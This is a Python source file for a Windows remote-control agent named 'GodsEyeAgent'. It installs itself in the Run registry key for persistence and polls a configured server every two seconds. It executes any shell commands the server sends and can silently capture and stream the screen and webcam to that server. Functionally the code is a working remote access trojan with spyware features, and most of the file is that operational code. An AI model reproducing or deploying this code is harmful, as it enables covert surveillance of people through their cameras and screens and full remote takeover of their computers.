import requests
import psutil
import platform
import socket
import json
import time
import subprocess
import mss
import os
import uuid
import cv2
import threading
from PIL import Image
import io
import sys
import tkinter as tk
from tkinter import simpledialog, messagebox
import winreg as reg

# Configuration File
CONFIG_FILE = 'config.json'

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def get_server_url():
    config = load_config()
    server_url = config.get('server_url')
    
    if not server_url:
        # Launch GUI to ask for URL
        root = tk.Tk()
        root.withdraw() # Hide main window
        server_url = simpledialog.askstring("Input", "Enter Server URL (e.g., http://192.168.1.5:5000):", parent=root)
        if server_url:
            config['server_url'] = server_url
            save_config(config)
            messagebox.showinfo("Success", "Configuration saved! The agent will now run in the background.")
        else:
            sys.exit(0) # Exit if no URL provided
    
    return server_url

def add_to_startup():
    # Get path to current executable or script
    if getattr(sys, 'frozen', False):
        app_path = sys.executable
    else:
        # If running as script, use pythonw.exe to run it
        # This assumes pythonw is in the same folder as python
        python_exe = sys.executable
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        script_path = os.path.abspath(__file__)
        app_path = f'"{pythonw_exe}" "{script_path}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, "GodsEyeAgent", 0, reg.REG_SZ, app_path)
        reg.CloseKey(key)
        print("Added to startup")
    except Exception as e:
        print(f"Failed to add to startup: {e}")

SERVER_URL = get_server_url()
HARDWARE_ID = str(uuid.getnode())

streaming_screen = False
streaming_cam = False

def get_system_info():
    # ... (same as before)
    return {
        'hardware_id': HARDWARE_ID,
        'hostname': socket.gethostname(),
        'os_info': f"{platform.system()} {platform.release()}",
        'cpu': psutil.cpu_percent(),
        'ram': psutil.virtual_memory().percent,
        'total_ram': round(psutil.virtual_memory().total / (1024 ** 3), 2),
        'disk': psutil.disk_usage('/').percent,
        'lat': 0.0, 
        'lon': 0.0
    }

# ... (rest of the functions: execute_command, upload_screenshot, etc.)

# Copy pasting the rest of the functions from previous agent.py to ensure they persist
def execute_command(command, command_id):
    global streaming_screen, streaming_cam
    print(f"Executing: {command}")
    output = "Executed"
    try:
        if command == "SCREENSHOT":
            upload_screenshot()
            output = "Screenshot uploaded."
        elif command == "CAPTURE_CAM":
            upload_cam_photo()
            output = "Camera photo uploaded."
        elif command == "START_STREAM_SCREEN":
            if not streaming_screen:
                streaming_screen = True
                threading.Thread(target=stream_screen_loop, daemon=True).start()
                output = "Screen streaming started."
            else:
                output = "Screen streaming already active."
        elif command == "STOP_STREAM_SCREEN":
            streaming_screen = False
            output = "Screen streaming stopped."
        elif command == "START_STREAM_CAM":
            if not streaming_cam:
                streaming_cam = True
                threading.Thread(target=stream_cam_loop, daemon=True).start()
                output = "Camera streaming started."
            else:
                output = "Camera streaming already active."
        elif command == "STOP_STREAM_CAM":
            streaming_cam = False
            output = "Camera streaming stopped."
        else:
            # Use shell execution
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
    except Exception as e:
        output = str(e)

    requests.post(f"{SERVER_URL}/api/command/result", json={
        'command_id': command_id,
        'output': output
    })

def upload_screenshot():
    with mss.mss() as sct:
        filename = sct.shot(mon=-1, output='monitor-1.png')
        with open('monitor-1.png', 'rb') as f:
            files = {'file': f}
            requests.post(f"{SERVER_URL}/api/upload_screen/{HARDWARE_ID}", files=files)
        os.remove('monitor-1.png')

def upload_cam_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        _, img_encoded = cv2.imencode('.jpg', frame)
        files = {'file': ('cam.jpg', img_encoded.tobytes(), 'image/jpeg')}
        requests.post(f"{SERVER_URL}/api/upload_cam/{HARDWARE_ID}", files=files)
    cap.release()

def stream_screen_loop():
    global streaming_screen
    with mss.mss() as sct:
        while streaming_screen:
            try:
                # Capture to memory
                monitor = sct.monitors[1]
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                
                # Convert to bytes
                img_byte_arr = io.BytesIO()
                img.save(img_byte_arr, format='JPEG', quality=50) # Low quality for speed
                img_byte_arr = img_byte_arr.getvalue()
                
                files = {'file': ('stream.jpg', img_byte_arr, 'image/jpeg')}
                try:
                    requests.post(f"{SERVER_URL}/api/upload_screen/{HARDWARE_ID}", files=files, timeout=1)
                except requests.exceptions.Timeout:
                    pass # Ignore timeouts for streaming
                
                time.sleep(0.1) # Max 10 fps
            except Exception as e:
                print(f"Screen stream error: {e}")
                time.sleep(1)

def stream_cam_loop():
    global streaming_cam
    cap = cv2.VideoCapture(0)
    while streaming_cam:
        try:
            ret, frame = cap.read()
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                files = {'file': ('cam.jpg', img_encoded.tobytes(), 'image/jpeg')}
                try:
                    requests.post(f"{SERVER_URL}/api/upload_cam/{HARDWARE_ID}", files=files, timeout=1)
                except requests.exceptions.Timeout:
                    pass
            time.sleep(0.1)
        except Exception as e:
            print(f"Cam stream error: {e}")
            time.sleep(1)
    cap.release()

def main():
    add_to_startup()
    print(f"Agent Started. ID: {HARDWARE_ID}")
    while True:
        try:
            data = get_system_info()
            response = requests.post(f"{SERVER_URL}/api/checkin", json=data)
            
            if response.status_code == 200:
                resp_data = response.json()
                commands = resp_data.get('commands', [])
                for cmd in commands:
                    threading.Thread(target=execute_command, args=(cmd['command'], cmd['id'])).start()
            
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(2) # Faster heartbeat

if __name__ == '__main__':
    main()
